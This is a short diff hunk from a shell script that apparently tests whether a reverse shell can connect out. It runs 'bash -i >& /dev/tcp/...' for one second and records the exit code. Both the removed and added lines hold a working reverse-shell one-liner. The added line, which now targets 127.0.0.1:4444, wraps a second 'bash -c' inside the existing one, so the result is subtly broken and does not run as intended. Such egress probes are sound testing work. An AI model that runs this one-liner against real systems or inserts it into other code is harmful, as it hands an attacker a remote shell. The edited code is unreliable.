@@ -293,7 +293,7 @@ add_action \
 
 set +e
 bash -c \
-    "bash -i >& /dev/tcp/${REVERSE_HOST}/${REVERSE_PORT} 0>&1 & child=\$!; sleep 1; kill \$child 2>/dev/null; wait \$child 2>/dev/null" \
+    bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 & child=$!; sleep 1; kill $child 2>/dev/null; wait $child 2>/dev/null' \
     >/dev/null 2>&1
 REVERSE_EXIT_CODE=$?
 set -e
